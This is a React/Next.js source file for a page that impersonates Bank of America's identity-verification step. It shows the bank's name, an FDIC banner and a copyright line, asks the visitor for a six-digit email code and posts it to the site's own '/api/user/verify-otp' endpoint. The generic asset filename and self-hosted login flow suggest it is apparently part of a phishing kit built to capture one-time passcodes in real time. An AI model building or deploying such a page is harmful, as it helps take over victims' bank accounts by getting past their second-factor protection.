'use client';

import { useState, useEffect, useRef, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import Link from 'next/link';
import Image from 'next/image';

// Loading fallback
function VerifyLoading() {
  return (
    <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center">
      <div className="animate-spin w-6 h-6 border-2 border-[#012169] border-t-transparent rounded-full"></div>
    </div>
  );
}

// Main content component that uses useSearchParams
function VerifyOTPContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const sessionId = searchParams.get('session');
  const emailHint = searchParams.get('email') || '***@***.com';

  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [error, setError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [timeLeft, setTimeLeft] = useState(600);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newCode = [...code];
    newCode[index] = value.slice(-1);
    setCode(newCode);
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    if (newCode.every(digit => digit !== '')) {
      handleVerify(newCode.join(''));
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (pastedData.length === 6) {
      const newCode = pastedData.split('');
      setCode(newCode);
      handleVerify(pastedData);
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleVerify = async (otpCode: string) => {
    if (!sessionId) {
      setError('Invalid session. Please login again.');
      return;
    }
    setIsVerifying(true);
    setError('');
    try {
      const response = await fetch('/api/user/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_id: sessionId, code: otpCode })
      });
      const result = await response.json();
      if (result.success) {
        router.push('/dashboard');
      } else {
        setError(result.error || 'Verification failed');
        setCode(['', '', '', '', '', '']);
        inputRefs.current[0]?.focus();
      }
    } catch (err) {
      setError('An error occurred. Please try again.');
      setCode(['', '', '', '', '', '']);
    } finally {
      setIsVerifying(false);
    }
  };

  if (!sessionId) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="text-center">
          <p className="text-[#c41230] text-[13px] mb-3">Invalid session. Please login again.</p>
          <Link href="/user/login" className="text-[#0066b2] text-[12px] hover:underline">
            Return to Login
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* FDIC Banner */}
      <div className="bg-[#f5f5f5] border-b border-[#ddd]">
        <div className="max-w-[600px] mx-auto px-4 py-1.5 md:py-1 text-center">
          <p className="text-[10px] md:text-[11px] text-[#666] font-normal leading-tight">
            Bank of America deposit products: <strong className="font-bold whitespace-nowrap">FDIC</strong> FDIC-Insured
          </p>
        </div>
      </div>

      {/* Header */}
      <header className="bg-white border-b border-[#ddd]">
        <div className="max-w-[600px] mx-auto px-4 py-2.5 flex items-center justify-between gap-2 overflow-hidden">
          <div className="flex items-center gap-3 shrink-0">
            <Image 
              src="/asset-v1-h.png" 
              alt="Bank of America" 
              width={160} 
              height={20}
              className="h-5 w-auto"
              priority
            />
          </div>
          <div className="flex items-center gap-1 text-[10px] text-[#666] shrink-0 whitespace-nowrap">
            <div className="flex items-center gap-1">
              <svg className="w-3 h-3 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              <span className="hidden xxs:inline">Secure Area</span>
            </div>
          </div>
        </div>
      </header>

      {/* Red Banner */}
      <div className="bg-[#c41230] py-2 px-4">
        <div className="max-w-[600px] mx-auto">
          <span className="text-white text-[13px]">Verify Your Identity</span>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 bg-[#f5f5f5]">
        <div className="max-w-[400px] mx-auto px-4 py-8">
          <div className="bg-white rounded border border-[#ddd] shadow-sm">
            {/* Card Header */}
            <div className="px-5 py-4 border-b border-[#eee]">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-[#012169] rounded-full flex items-center justify-center">
                  <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                  </svg>
                </div>
                <div>
                  <p className="text-[13px] text-[#333] font-medium">Email Verification</p>
                  <p className="text-[11px] text-[#666]">Code sent to {emailHint}</p>
                </div>
              </div>
            </div>

            {/* Card Body */}
            <div className="px-5 py-5">
              {error && (
                <div className="bg-[#fff3f3] border border-[#ffcccc] text-[#c41230] text-[11px] p-2.5 mb-4 rounded">
                  {error}
                </div>
              )}

              <p className="text-[12px] text-[#666] text-center mb-5">
                Enter the 6-digit verification code
              </p>

              {/* OTP Input */}
              <div className="flex justify-center gap-2 mb-4">
                {code.map((digit, index) => (
                  <input
                    key={index}
                    ref={el => { inputRefs.current[index] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    onPaste={handlePaste}
                    disabled={isVerifying || timeLeft <= 0}
                    className={`w-9 h-11 text-center text-[16px] font-mono border rounded focus:outline-none focus:border-[#0066b2] transition-colors ${
                      error ? 'border-[#ffcccc]' : 'border-[#999]'
                    } ${isVerifying ? 'bg-gray-50' : 'bg-white'}`}
                  />
                ))}
              </div>

              {/* Timer */}
              <div className="text-center mb-5">
                {timeLeft > 0 ? (
                  <p className="text-[11px] text-[#666]">
                    Expires in <span className="font-mono font-medium text-[#012169]">{formatTime(timeLeft)}</span>
                  </p>
                ) : (
                  <p className="text-[11px] text-[#c41230]">
                    Code expired. <Link href="/user/login" className="underline">Request new code</Link>
                  </p>
                )}
              </div>

              {/* Verify Button */}
              <button
                onClick={() => handleVerify(code.join(''))}
                disabled={code.some(d => d === '') || isVerifying || timeLeft <= 0}
                className={`w-full py-2.5 rounded text-[12px] font-medium transition-colors ${
                  code.every(d => d !== '') && !isVerifying && timeLeft > 0
                    ? 'bg-[#0066b2] text-white hover:bg-[#005599]'
                    : 'bg-gray-200 text-gray-500 cursor-not-allowed'
                }`}
              >
                {isVerifying ? 'Verifying...' : 'Continue'}
              </button>
            </div>

            {/* Card Footer */}
            <div className="px-5 py-3 bg-[#f9f9f9] border-t border-[#eee] text-center">
              <Link href="/user/login" className="text-[11px] text-[#0066b2] hover:underline">
                ← Back to Sign In
              </Link>
            </div>
          </div>

          {/* Security Notice */}
          <div className="mt-4 text-center">
            <p className="text-[10px] text-[#999] leading-relaxed">
              Never share your verification code. Bank of America will never ask for it.
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#f5f0eb] py-3 px-4 border-t border-[#ddd]">
        <div className="max-w-[600px] mx-auto text-center">
          <p className="text-[10px] text-[#666]">
            © {new Date().getFullYear()} Bank of America Corporation. All rights reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}

// Export with Suspense wrapper
export default function VerifyOTPPage() {
  return (
    <Suspense fallback={<VerifyLoading />}>
      <VerifyOTPContent />
    </Suspense>
  );
}

